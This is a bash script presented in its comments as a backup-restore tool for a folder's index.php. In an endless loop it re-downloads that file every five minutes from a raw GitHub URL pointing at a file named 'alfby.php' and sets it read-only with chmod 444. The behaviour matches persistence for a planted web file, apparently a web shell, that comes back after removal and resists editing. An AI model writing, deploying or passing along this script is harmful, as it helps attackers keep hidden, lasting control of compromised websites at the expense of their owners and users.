#!/bin/bash

# Set the path to the folder containing the index.php file
FOLDER_PATH="/path/to/your/folder"

# Set the path to the index.php file
FILE_PATH="$FOLDER_PATH/index.php"

# Set the URL to the backup file
BACKUP_URL="https://raw.githubusercontent.com/slavination/odinastic/main/alfby.php"

# Set the permission to 444
PERMISSION="444"

# Check if the file exists
if [ ! -f "$FILE_PATH" ]; then
  # If the file doesn't exist, restore it from backup
  wget -q -O "$FILE_PATH" "$BACKUP_URL"
  echo "File restored from backup."
fi

# Set the permission to 444
chmod $PERMISSION "$FILE_PATH"
echo "Permission set to $PERMISSION."

# Run the script in the background every 5 minutes
while true
do
  # Check if the file exists
  if [ ! -f "$FILE_PATH" ]; then
    # If the file doesn't exist, restore it from backup
    wget -q -O "$FILE_PATH" "$BACKUP_URL"
    echo "File restored from backup."
  fi

  # Set the permission to 444
  chmod $PERMISSION "$FILE_PATH"
  echo "Permission set to $PERMISSION."

  # Sleep for 5 minutes
  sleep 300
done
